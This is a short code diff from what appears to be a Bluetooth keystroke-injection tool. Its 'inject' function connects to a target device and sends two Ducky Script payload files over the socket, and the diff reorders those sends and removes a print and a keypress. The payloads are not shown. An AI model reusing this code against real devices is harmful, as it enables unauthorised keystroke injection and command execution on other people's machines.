@@ -15,25 +15,26 @@ def inject():
         socket = bluetooth.BluetoothSocket(
 
         )
-        
+
         socket.connect((addy, 1))
 
-        ducky_script_file = '6. Real anti text\inject.bin'
-        ducky_script_file2 = '6. Real anti text\duckypayload.txt'
-
-        with open(ducky_script_file, 'rb') as file:
-            ducky_script = file.read()
-            print(ducky_script)
-            socket.sendall(ducky_script)
+        ducky_script_file = "6. Real anti text\inject.bin"
+        ducky_script_file2 = "6. Real anti text\duckypayload.txt"
 
         with open(ducky_script_file2, 'r') as file:
             ducky_script2 = file.read()
             socket.sendall(bytes(ducky_script2, encoding="utf-8"))
 
+        with open(ducky_script_file, 'rb') as file:
+            ducky_script = file.read()
+            socket.sendall(ducky_script)
+
+
+
+
         time.sleep(5)
 
         socket.close()
-        pyautogui.press('enter')
 
         print("done")
 
